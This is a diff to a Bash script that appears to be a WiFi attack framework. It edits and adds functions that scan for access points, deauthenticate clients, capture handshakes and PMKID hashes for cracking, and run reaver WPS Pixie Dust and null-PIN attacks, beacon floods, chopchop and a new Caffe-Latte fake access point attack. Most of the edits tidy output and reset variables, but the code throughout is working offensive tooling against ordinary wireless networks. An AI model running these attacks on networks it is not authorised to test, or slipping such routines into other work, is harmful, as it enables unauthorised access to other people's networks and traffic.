@@ -658,8 +658,9 @@ function deauth_all_clients(){
 
 	mkdir "/opt/wef/main/captures/$name" 2>/dev/null
 	cp Capture-* "/opt/wef/main/captures/$name/" 2>/dev/null
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 	rm Capture-* 2>/dev/null
+	sleep 0.2
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 	sleep 0.1
 	report-gen
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
@@ -668,10 +669,12 @@ function deauth_all_clients(){
 		echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read cracking_option
 	fi
 
-	sleep 0.2
+	sleep 0.1
 	if [ "$cracking_option" == "y" ] || [ "$cracking_option" == "yes" ]; then
 		handshake_crack
 	else
+		name=""
+		attack_time=""
 		keep_exit
 	fi
 }
@@ -716,20 +719,23 @@ function deauth_one_client(){
 	mkdir "/opt/wef/main/captures/$name/" 2>/dev/null
 	cp Capture-* "/opt/wef/main/captures/$name/" 2>/dev/null
 	rm Capture-* 2>/dev/null
+	sleep 0.3
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 	sleep 0.1
 	report-gen
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
 	sleep 0.3
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 
 	if [ "$catch_handshakes" == "y" ] || [ "$catch_handshakes" == "yes" ]; then
 		echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read crack_option
 	fi
 
-	sleep 0.2
+	sleep 0.1
 	if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
 		handshake_crack
 	else
+		name=""
+		attack_time=""
 		keep_exit
 	fi
 }
@@ -789,7 +795,7 @@ function pmkid_crack(){
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}WiFi${endColour}${blueColour}] Choose an option >${endColour} " && read pmkid_option
 
 	if [ "$pmkid_option" == "2" ] || [ "$pmkid_option" == "one" ]; then
-		grep -i "${pmkid_bssid}" "/opt/wef/main/captures/$name/pmkid_hashes" > "/opt/wef/main/captures/$name/${name}_hash"
+		grep -i ${pmkid_bssid} "/opt/wef/main/captures/${name}/pmkid_hashes" > "/opt/wef/main/captures/$name/${name}_hash"
 		file_to_crack="/opt/wef/main/captures/$name/${name}_hash"
 		test -f "/opt/wef/main/captures/$name/${name}_hash"
 	elif [ "$pmkid_option" == "1" ] || [ "$pmkid_option" == "all" ]; then
@@ -847,11 +853,26 @@ function auth_attack(){
 	banner2
 	sleep 0.3
 
-	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
-	timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+	test -f scan_output
+	if [ "$(echo $?)" == "0" ]; then
+		if [ "$name_counter" != "1" ]; then
+			echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+			timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+		else
+			echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Target AP:${endColour}${yellowColour} ${name}${endColour}"
+		fi
 
-	echo
-	ask_data2
+	elif [ "${name}" ]; then
+		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+		timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Target AP:${endColour}${yellowColour} ${name}${endColour}"
+	else
+		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+		timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+		echo
+		ask_data2
+	fi
+
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
 	ap_mac=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
 
@@ -879,14 +900,17 @@ function auth_attack(){
 		kill -9 $air2_PID; wait $air2_PID 2>/dev/null
 	fi
 
+	sleep 0.3
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Authentication Attack completed${endColour}"
 	sleep 0.1
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log${endColour}"
-	sleep 0.3
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 	cp Capture-* "/opt/wef/main/captures/$name/" 2>/dev/null
 	rm -rf Capture-* 2>/dev/null
 	report-gen
 	sleep 1
+
+	name=""
+	attack_time=""
 	keep_exit
 }
 
@@ -967,6 +991,9 @@ function beacon_flood(){
 	report-gen
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log${endColour}"
 	sleep 1
+
+	name=""
+	attack_time=""
 	keep_exit
 }
 
@@ -996,7 +1023,8 @@ function pmkid_attack(){
 		ask_data2
 	fi
 
-	if [ "${time_counter}" != "1" ]; then
+	if [ ! "${attack_time}" ]; then
+		echo
 		ask_time
 	else
 		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack time:${endColour}${yellowColour} ${attack_time}${endColour}"
@@ -1004,20 +1032,23 @@ function pmkid_attack(){
 
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
 	pmkid_bssid=$(cat scan_output | grep "${name}$" | awk '{print $1}' | head -n 1 | tr -d ":")
+
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting PMKID attack...${endColour}"
 
-	mkdir "/opt/wef/main/captures/$name" 2>/dev/null
+	mkdir "/opt/wef/main/captures/$name"
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 
 	echo
-	timeout ${attack_time} bash -c "hcxdumptool -i ${netCard} --enable_status=1 -o pmkid_capture 2>/dev/null | grep 'PMKIDROGUE:'"
+	timeout "${attack_time}" bash -c "hcxdumptool -i ${netCard} --enable_status=1 -o pmkid_capture 2>/dev/null | grep 'PMKIDROGUE:'"
 
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Obtaining hashes...${endColour}"
 	sleep 1
 
-	cp "${dir}/pmkid_capture /opt/wef/main/captures/$name/" 2>/dev/null
-	hcxpcaptool -z "${dir}/pmkid_hashes ${dir}/pmkid_capture" &>/dev/null ; rm "${dir}/pmkid_capture" 2>/dev/null
-	cp "${dir}/pmkid_hashes /opt/wef/main/captures/$name/" 2>/dev/null
+	rm "/opt/wef/main/captures/${name}/pmkid_capture" 2>/dev/null
+	cp "${dir}/pmkid_capture" "/opt/wef/main/captures/${name}/" 2>/dev/null
+	hcxpcaptool -z pmkid_hashes ${dir}/pmkid_capture &>/dev/null
+	rm "${dir}/pmkid_capture" #2>/dev/null
+	cp "${dir}/pmkid_hashes" "/opt/wef/main/captures/${name}/" #2>/dev/null
 
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] PMKID Attack completed${endColour}"
 	sleep 0.3
@@ -1039,12 +1070,34 @@ function passive_attack(){
 	clear
 	banner2
 	sleep 0.3
-	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
-	timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
 
-	echo
-	ask_data2
-	ask_time
+	test -f scan_output
+	if [ "$(echo $?)" == "0" ]; then
+		if [ "$name_counter" != "1" ]; then
+			echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+			timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+		else
+			echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Target AP:${endColour}${yellowColour} ${name}${endColour}"
+		fi
+
+	elif [ "${name}" ]; then
+		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+		timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Target AP:${endColour}${yellowColour} ${name}${endColour}"
+	else
+		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+		timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+		echo
+		ask_data2
+	fi
+
+	if [ ! "${attack_time}" ]; then
+		echo
+		ask_time
+	else
+		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack time:${endColour}${yellowColour} ${attack_time}${endColour}"
+	fi
+
 	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
 
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
@@ -1072,6 +1125,8 @@ function passive_attack(){
 	if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ]; then
 		handshake_crack
 	else
+		name=""
+		attack_time=""
 		keep_exit
 	fi
 
@@ -1147,14 +1202,19 @@ function pixie_dust(){
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Pixie Dust attack...${endColour}\n"
 	sleep 0.3
-	timeout 80 bash -c "reaver -i ${netCard} -b ${ap_mac} -c ${channel} -K 1 -vv -g 5"
+	if [ "$verbose" == "0" ]; then
+		reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -v -g 3
+	elif [ "$verbose" == "1" ]; then
+		reaver -i ${netCard} -b ${ap_mac} -c ${channel} -K 1 -vv -g 3
+	fi
+
 	sleep 0.3
 
 	mkdir "/opt/wef/main/captures/$name/" 2>/dev/null
 	report-gen
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Pixie Dust Attack completed${endColour}"
+	sleep 0.1
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
-	sleep 0.3
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 	sleep 1
 	keep_exit
 }
@@ -1176,20 +1236,53 @@ function null-pin(){
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Null Pin attack...${endColour}"
 	timeout 60 bash -c "reaver -i ${netCard} -b ${ap_mac} -c ${channel} -f -N -g 2 -vv -p ''"
 
-	sleep 0.4
+	sleep 0.2
 	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
 	mkdir "/opt/wef/main/captures/$name" 2>/dev/null
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Null Pin Attack completed${endColour}"
+	sleep 0.1
 	report-gen
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
-	sleep 0.3
-	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
 	sleep 1
 	keep_exit
 }
 
 # Caffe-Latte Attack
 function caffe-latte(){
+	clear
+	banner1
+	sleep 0.3
+
+	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Scanning networks...${endColour}\n"
+	timeout 22 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
+	sleep 0.1
+
 	echo
+	ask_data2
+	ask_time
+
+	channel=$(cat scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
+
+	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Caffe-Latte attack...${endColour}"
+	xterm -hold -e "airodump-ng -c ${channel} -w CaffeLatte ${netCard}" &
+	air_PID=$!
+
+	timeout ${attack_time} bash -c "airbase-ng -c ${channel} --essid ${name} ${netCard} -L -x 100"
+	sleep 0.2
+	kill -9 ${air_PID}; wait $air_PID 2>/dev/null
+
+	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+	mkdir "/opt/wef/main/captures/$name" 2>/dev/null
+	cp CaffeLatte "/opt/wef/main/captures/${name}" 2>/dev/null
+	rm CaffeLatte 2>/dev/null
+	report-gen
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Caffe-Latte Attack completed${endColour}"
+	sleep 0.1
+	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Captures stored in: /opt/wef/main/captures/${name}/${endColour}"
+	sleep 0.1
+	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
+	sleep 1
+	keep_exit
 }
 
 # Chopchop Attack
@@ -1213,15 +1306,14 @@ function chopchop(){
 	aireplay-ng -1 0 -e "${name}" -a ${client_mac} -h ${ap_mac} ${netCard}
 	sleep 0.3; echo -e "\n"
 	aireplay-ng -4 -h ${client_mac} -b $ap_mac ${netCard}
-	sleep 0.1
+	sleep 0.3
 
 	mkdir "/opt/wef/main/captures/$name" 2>/dev/null
 	report-gen
 	cp Capture* "/opt/wef/main/captures/$name/" 2>/dev/null
-	sleep 0.3
-	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
-	sleep 0.3
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
+	sleep 0.1
+	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/wef/main/logs/$name.log ${endColour}"
 	sleep 1
 	keep_exit
 }
@@ -2106,7 +2198,7 @@ if [ "$(id -u)" == "0" ]; then
 				sleep 0.15
 				mon_check=$(check_interface_mode)
 				type_of_attack="Passive/Stealthy Attack"
-				if [ "$mon_check" == "Monitor" ]; then
+				if [ "$mon_check" == "monitor" ]; then
 					sleep 0.15
 					passive_attack
 				else
